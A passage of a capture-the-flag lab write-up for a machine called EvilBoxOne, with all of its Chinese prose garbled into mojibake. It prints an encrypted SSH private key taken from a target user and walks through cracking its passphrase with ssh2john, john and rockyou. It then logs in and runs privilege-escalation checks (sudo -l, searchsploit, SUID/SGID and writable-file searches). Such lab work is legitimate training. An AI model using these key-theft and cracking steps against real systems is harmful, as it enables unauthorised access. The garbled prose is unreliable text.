<p>æˆåŠŸè¯»å–åˆ°ç›®æ ‡ç”¨æˆ·mowreeç›®å½•ä¸‹çš„ç§é’¥(å³é”®æºç  æ ¼å¼æ›´ä½³ï¼)</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&gt;-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">&gt;Proc-Type: 4,ENCRYPTED</span><br><span class="line">&gt;DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E</span><br><span class="line"></span><br><span class="line">&gt;uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6</span><br><span class="line">&gt;hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe</span><br><span class="line">&gt;o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb</span><br><span class="line">&gt;+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot</span><br><span class="line">&gt;b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k</span><br><span class="line">&gt;HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg</span><br><span class="line">&gt;9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY</span><br><span class="line">&gt;zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu</span><br><span class="line">&gt;rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1</span><br><span class="line">&gt;tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs</span><br><span class="line">&gt;94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm</span><br><span class="line">&gt;VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7</span><br><span class="line">&gt;Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P</span><br><span class="line">&gt;hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr</span><br><span class="line">&gt;Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR</span><br><span class="line">&gt;IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R</span><br><span class="line">&gt;MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS</span><br><span class="line">&gt;62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69</span><br><span class="line">&gt;Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8</span><br><span class="line">&gt;p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C</span><br><span class="line">&gt;pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X</span><br><span class="line">&gt;KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa</span><br><span class="line">&gt;i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp</span><br><span class="line">&gt;4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/</span><br><span class="line">&gt;8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==</span><br><span class="line">&gt;-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="11-æ‰‹æ¡å…¬ç§é’¥å°è¯•ç™»é™†"><a href="#11-æ‰‹æ¡å…¬ç§é’¥å°è¯•ç™»é™†" class="headerlink" title="11.æ‰‹æ¡å…¬ç§é’¥å°è¯•ç™»é™†"></a>11.æ‰‹æ¡å…¬ç§é’¥å°è¯•ç™»é™†</h3><p>æ¸…ç‚¹ä¸€ä¸‹ï¼š</p>
<p>æœåŠ¡å™¨æ”¯æŒå…¬é’¥çš„è®¤è¯æ–¹å¼â€“ç”¨æˆ·çš„ç›®å½•ä¸‹å­˜åœ¨å…¬é’¥â€“æœåŠ¡å™¨å…è®¸ç”¨æˆ·mowreeä½¿ç”¨å…¬é’¥ç™»é™†â€“æ‹¿å–åˆ°äº†ç§é’¥â€“æ‹¥æœ‰ç§é’¥çš„ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥ä½¿ç”¨ç§é’¥å°è¯•ç™»é™†æœåŠ¡å™¨â€“ä¸éœ€è¦è´¦å·å¯†ç â€“åˆ©ç”¨å…¬é’¥è¯æ˜èº«ä»½</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi id_rsa</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208231311174.png" alt="image-20211208231311174"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208231920190.png" alt="image-20211208231920190"></p>
<p>ä½¿ç”¨ç§é’¥sshç™»é™†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mowree@192.168.0.108 -i id_rsa </span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208232318351.png" alt="image-20211208232318351"></p>
<p>å†é‡å¯†ç ..æ²¡å®Œæ²¡äº†..</p>
<h3 id="12-çˆ†ç ´ç‹‚äººçº¦ç¿°"><a href="#12-çˆ†ç ´ç‹‚äººçº¦ç¿°" class="headerlink" title="12.çˆ†ç ´ç‹‚äººçº¦ç¿°"></a>12.çˆ†ç ´ç‹‚äººçº¦ç¿°</h3><p>éœ¸ç‹ç¡¬ä¸Šå¼“â€“&gt;çˆ†ç ´ğŸ’£â€“&gt;é€‰æ‹©ä¸€æœ¬è¶³å¤Ÿå¼ºå¤§çš„å­—å…¸ğŸ“–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/wordlists/rockyou.txt.gz . </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip rockyou.txt.gz</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208232910798.png" alt="image-20211208232910798"></p>
<p>ä½¿ç”¨johnå‰ï¼Œéœ€å°†ç§é’¥è½¬æ¢ä¸ºè¯¥å·¥å…·å¯ä»¥ä½¿ç”¨çˆ†ç ´çš„æ ¼å¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/john</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ssh2john.py ~/id_rsa &gt; ~/hash</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208233910653.png" alt="image-20211208233910653"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john hash --wordlist=rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208234313571.png" alt="image-20211208234313571"></p>
<p>çˆ†ç ´ç»“æœå¾—åˆ°çš„å¯†ç ä¸ºï¼šunicorn</p>
<p>èƒ¸æœ‰æˆç«¹çš„è¿›è¡Œç™»é™†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mowree@192.168.0.108 -i id_rsa </span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208234716317.png" alt="image-20211208234716317"></p>
<p>ç»ˆäºçªç ´äº†è¾¹ç•Œ è·å–åˆ°äº†ç¬¬ä¸€ä¸ªflag 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p>
<p>å¦å¤–ä¸€ä¸ªflagåº”è¯¥æ˜¯éœ€è¦rootç”¨æˆ·æ‰èƒ½æ‹¿åˆ°çš„</p>
<h3 id="13-ææƒå†²é”‹ğŸ›"><a href="#13-ææƒå†²é”‹ğŸ›" class="headerlink" title="13.ææƒå†²é”‹ğŸ›"></a>13.ææƒå†²é”‹ğŸ›</h3><p>å°è¯•ææƒ</p>
<h4 id="1-æŸ¥çœ‹å½“å‰æœ‰æ— è®¡åˆ’ä»»åŠ¡"><a href="#1-æŸ¥çœ‹å½“å‰æœ‰æ— è®¡åˆ’ä»»åŠ¡" class="headerlink" title="1)æŸ¥çœ‹å½“å‰æœ‰æ— è®¡åˆ’ä»»åŠ¡"></a>1)æŸ¥çœ‹å½“å‰æœ‰æ— è®¡åˆ’ä»»åŠ¡</h4><p>åˆ©ç”¨è„šæœ¬å°±â€¦</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l    </span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208235115298.png" alt="image-20211208235115298"></p>
<p>å¹¶æ²¡æœ‰ğŸ˜–</p>
<h4 id="2-æŸ¥çœ‹sudoæƒé™é…ç½®æ–¹é¢æœ‰æ— ç¼ºé™·"><a href="#2-æŸ¥çœ‹sudoæƒé™é…ç½®æ–¹é¢æœ‰æ— ç¼ºé™·" class="headerlink" title="2)æŸ¥çœ‹sudoæƒé™é…ç½®æ–¹é¢æœ‰æ— ç¼ºé™·"></a>2)æŸ¥çœ‹sudoæƒé™é…ç½®æ–¹é¢æœ‰æ— ç¼ºé™·</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l       	</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208235258827.png" alt="image-20211208235258827"></p>
<p>å¹¶æ²¡æœ‰ğŸ˜–</p>
<h4 id="3-æŸ¥çœ‹å†…æ ¸æ˜¯å¦å­˜åœ¨æ¼æ´"><a href="#3-æŸ¥çœ‹å†…æ ¸æ˜¯å¦å­˜åœ¨æ¼æ´" class="headerlink" title="3)æŸ¥çœ‹å†…æ ¸æ˜¯å¦å­˜åœ¨æ¼æ´"></a>3)æŸ¥çœ‹å†…æ ¸æ˜¯å¦å­˜åœ¨æ¼æ´</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a      </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 4.19 </span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208235652875.png" alt="image-20211208235652875"></p>
<p>å‡ ç•ªå°è¯•å éƒ½å¤±è´¥äº†â€¦..è£‚å¼€â€¦â€¦ğŸ˜­</p>
<h4 id="4-åˆ©ç”¨find-suid"><a href="#4-åˆ©ç”¨find-suid" class="headerlink" title="4)åˆ©ç”¨find suid"></a>4)åˆ©ç”¨find suid</h4><p>å¯»æ‰¾è¿™å°é¶æœºä¸Šçš„å“ªäº›ç¨‹åº&#x2F;å¯æ‰§è¡Œæ–‡ä»¶æ˜¯å…·æœ‰suidæƒé™ä¸”å±ä¸»æ˜¯root</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null</span><br><span class="line">#4000å³ä¸ºsuidæƒé™</span><br><span class="line">#å› ä¸ºæ˜¯ä»/æ ¹ç›®å½•æœç´¢çš„æ‰€æœ‰å³æœç´¢æ•´å°é¶æœºä¸Šçš„ç¨‹åº å¯èƒ½å› æƒé™ä¸è¶³ä¼šå­˜åœ¨æŠ¥é”™ ä¸ºäº†æ–¹ä¾¿çœ‹åˆ°æˆåŠŸä¿¡æ¯ å°†é”™è¯¯ä¿¡æ¯å®šå‘åˆ°/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211209000653290.png" alt="image-20211209000653290"></p>
<p>ç»“æœå¾ˆé—æ†¾è¿™äº›å¯æ‰§è¡Œæ–‡ä»¶éƒ½æ˜¯ç³»ç»Ÿé»˜è®¤çš„ å³æ˜¯å®‰å…¨çš„ æ²¡èƒ½å¤Ÿæ‰¾åˆ°çªç ´çš„ç‚¹</p>
<h4 id="5-åˆ©ç”¨find-sgid"><a href="#5-åˆ©ç”¨find-sgid" class="headerlink" title="5)åˆ©ç”¨find sgid"></a>5)åˆ©ç”¨find sgid</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm /2000 2&gt;/dev/null</span><br><span class="line">#2000å³ä¸ºsgidæƒé™</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211209001212656.png" alt="image-20211209001212656"></p>
<p>ä¾ç„¶æ˜¯é»˜è®¤çš„..å¾ˆå®‰å…¨..</p>
<h4 id="6-å¯»æ‰¾ç³»ç»Ÿä¸­å¯å†™çš„æ–‡ä»¶"><a href="#6-å¯»æ‰¾ç³»ç»Ÿä¸­å¯å†™çš„æ–‡ä»¶" class="headerlink" title="6)å¯»æ‰¾ç³»ç»Ÿä¸­å¯å†™çš„æ–‡ä»¶"></a>6)å¯»æ‰¾ç³»ç»Ÿä¸­å¯å†™çš„æ–‡ä»¶</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null | grep -v proc</span><br></pre></td></tr></table></figure>

<blockquote>
<p>mowree@EvilBoxOne:~$ find &#x2F; -writable 2&gt;&#x2F;dev&#x2F;null | grep -v proc<br>&#x2F;tmp<br>&#x2F;tmp&#x2F;.ICE-unix<br>&#x2F;tmp&#x2F;.X11-unix<br>&#x2F;tmp&#x2F;.Test-unix<br>&#x2F;tmp&#x2F;.font-unix<br>&#x2F;tmp&#x2F;.XIM-unix<br>&#x2F;sys&#x2F;kernel&#x2F;security&#x2F;apparmor&#x2F;.null<br>&#x2F;sys&#x2F;kernel&#x2F;security&#x2F;apparmor&#x2F;.remove<br>&#x2F;sys&#x2F;kernel&#x2F;security&#x2F;apparmor&#x2F;.replace<br>&#x2F;sys&#x2F;kernel&#x2F;security&#x2F;apparmor&#x2F;.load<br>&#x2F;sys&#x2F;kernel&#x2F;security&#x2F;apparmor&#x2F;.access<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;user.slice&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#x65;&#x72;&#64;&#x31;&#x30;&#x30;&#48;&#x2e;&#115;&#101;&#114;&#118;&#105;&#x63;&#101;">&#117;&#115;&#x65;&#x72;&#64;&#x31;&#x30;&#x30;&#48;&#x2e;&#115;&#101;&#114;&#118;&#105;&#x63;&#101;</a>&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;user.slice&#x2F;user-1000.slice&#x2F;session-14.scope&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;user.slice&#x2F;user-1000.slice&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;apache2.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;systemd-udevd.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;dev-disk-by\x2duuid-635c225b\x2d1f26\x2d4d4e\x2d912a\x2d87db360ddbb1.swap&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;cron.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;sys-kernel-debug.mount&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;systemd-journald.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;ssh.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;dev-mqueue.mount&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;rsyslog.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;<a href="mailto:&#x69;&#x66;&#x75;&#112;&#x40;&#x65;&#x6e;&#112;&#48;&#x73;&#51;&#46;&#x73;&#101;&#114;&#x76;&#x69;&#x63;&#x65;">&#x69;&#x66;&#x75;&#112;&#x40;&#x65;&#x6e;&#112;&#48;&#x73;&#51;&#46;&#x73;&#101;&#114;&#x76;&#x69;&#x63;&#x65;</a>&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;dev-hugepages.mount&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;dbus.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;systemd-timesyncd.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;system-getty.slice&#x2F;<a href="mailto:&#x67;&#x65;&#x74;&#116;&#x79;&#64;&#x74;&#x74;&#121;&#49;&#46;&#115;&#x65;&#114;&#x76;&#x69;&#99;&#x65;">&#x67;&#x65;&#x74;&#116;&#x79;&#64;&#x74;&#x74;&#121;&#49;&#46;&#115;&#x65;&#114;&#x76;&#x69;&#99;&#x65;</a>&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;system-getty.slice&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;systemd-logind.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#x73;&#101;&#114;&#x40;&#x31;&#48;&#48;&#48;&#46;&#x73;&#x65;&#x72;&#118;&#105;&#x63;&#x65;">&#117;&#x73;&#101;&#114;&#x40;&#x31;&#48;&#48;&#48;&#46;&#x73;&#x65;&#x72;&#118;&#105;&#x63;&#x65;</a><br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#x73;&#101;&#114;&#x40;&#49;&#x30;&#x30;&#x30;&#46;&#115;&#x65;&#114;&#118;&#x69;&#x63;&#x65;">&#117;&#x73;&#101;&#114;&#x40;&#49;&#x30;&#x30;&#x30;&#46;&#115;&#x65;&#114;&#118;&#x69;&#x63;&#x65;</a>&#x2F;tasks<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#115;&#x65;&#x72;&#64;&#49;&#48;&#x30;&#48;&#46;&#x73;&#101;&#x72;&#118;&#x69;&#x63;&#x65;">&#x75;&#115;&#x65;&#x72;&#64;&#49;&#48;&#x30;&#48;&#46;&#x73;&#101;&#x72;&#118;&#x69;&#x63;&#x65;</a>&#x2F;init.scope<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#x73;&#x65;&#114;&#64;&#x31;&#48;&#x30;&#48;&#46;&#115;&#101;&#x72;&#118;&#x69;&#x63;&#x65;">&#x75;&#x73;&#x65;&#114;&#64;&#x31;&#48;&#x30;&#48;&#46;&#115;&#101;&#x72;&#118;&#x69;&#x63;&#x65;</a>&#x2F;init.scope&#x2F;tasks<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#x73;&#x65;&#x72;&#x40;&#x31;&#48;&#48;&#48;&#x2e;&#x73;&#x65;&#114;&#x76;&#x69;&#99;&#101;">&#117;&#x73;&#x65;&#x72;&#x40;&#x31;&#48;&#48;&#48;&#x2e;&#x73;&#x65;&#114;&#x76;&#x69;&#99;&#101;</a>&#x2F;init.scope&#x2F;notify_on_release<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#115;&#x65;&#x72;&#64;&#49;&#x30;&#48;&#x30;&#x2e;&#115;&#x65;&#x72;&#118;&#105;&#x63;&#101;">&#x75;&#115;&#x65;&#x72;&#64;&#49;&#x30;&#48;&#x30;&#x2e;&#115;&#x65;&#x72;&#118;&#105;&#x63;&#101;</a>&#x2F;init.scope&#x2F;cgroup.clone_children<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#x73;&#x65;&#114;&#x40;&#x31;&#48;&#48;&#48;&#x2e;&#x73;&#x65;&#x72;&#x76;&#x69;&#x63;&#101;">&#x75;&#x73;&#x65;&#114;&#x40;&#x31;&#48;&#48;&#48;&#x2e;&#x73;&#x65;&#x72;&#x76;&#x69;&#x63;&#101;</a>&#x2F;cgroup.clone_children<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#x73;&#101;&#x72;&#64;&#x31;&#48;&#48;&#x30;&#x2e;&#x73;&#x65;&#x72;&#118;&#x69;&#99;&#x65;">&#117;&#x73;&#101;&#x72;&#64;&#x31;&#48;&#48;&#x30;&#x2e;&#x73;&#x65;&#x72;&#118;&#x69;&#99;&#x65;</a><br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#115;&#101;&#114;&#64;&#x31;&#48;&#x30;&#x30;&#x2e;&#x73;&#x65;&#114;&#x76;&#x69;&#x63;&#101;">&#x75;&#115;&#101;&#114;&#64;&#x31;&#48;&#x30;&#x30;&#x2e;&#x73;&#x65;&#114;&#x76;&#x69;&#x63;&#101;</a>&#x2F;cgroup.threads<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#x65;&#114;&#x40;&#49;&#x30;&#x30;&#48;&#46;&#x73;&#101;&#x72;&#x76;&#105;&#x63;&#101;">&#117;&#115;&#x65;&#114;&#x40;&#49;&#x30;&#x30;&#48;&#46;&#x73;&#101;&#x72;&#x76;&#105;&#x63;&#101;</a>&#x2F;init.scope<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#101;&#114;&#64;&#x31;&#48;&#48;&#48;&#x2e;&#115;&#101;&#114;&#118;&#x69;&#x63;&#101;">&#117;&#115;&#101;&#114;&#64;&#x31;&#48;&#48;&#48;&#x2e;&#115;&#101;&#114;&#118;&#x69;&#x63;&#101;</a>&#x2F;init.scope&#x2F;cgroup.max.descendants<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#x73;&#101;&#x72;&#64;&#x31;&#48;&#x30;&#48;&#46;&#115;&#x65;&#114;&#118;&#105;&#99;&#x65;">&#x75;&#x73;&#101;&#x72;&#64;&#x31;&#48;&#x30;&#48;&#46;&#115;&#x65;&#114;&#118;&#105;&#99;&#x65;</a>&#x2F;init.scope&#x2F;cgroup.type<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#x65;&#x72;&#x40;&#49;&#x30;&#48;&#x30;&#x2e;&#x73;&#x65;&#x72;&#x76;&#105;&#99;&#101;">&#117;&#115;&#x65;&#x72;&#x40;&#49;&#x30;&#48;&#x30;&#x2e;&#x73;&#x65;&#x72;&#x76;&#105;&#99;&#101;</a>&#x2F;init.scope&#x2F;cgroup.threads<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#x73;&#x65;&#x72;&#x40;&#49;&#x30;&#x30;&#x30;&#46;&#115;&#x65;&#x72;&#x76;&#105;&#99;&#101;">&#x75;&#x73;&#x65;&#x72;&#x40;&#49;&#x30;&#x30;&#x30;&#46;&#115;&#x65;&#x72;&#x76;&#105;&#99;&#101;</a>&#x2F;init.scope&#x2F;cgroup.subtree_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#x73;&#101;&#114;&#x40;&#49;&#48;&#48;&#48;&#46;&#x73;&#x65;&#114;&#118;&#105;&#x63;&#x65;">&#117;&#x73;&#101;&#114;&#x40;&#49;&#48;&#48;&#48;&#46;&#x73;&#x65;&#114;&#118;&#105;&#x63;&#x65;</a>&#x2F;init.scope&#x2F;cgroup.max.depth<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a 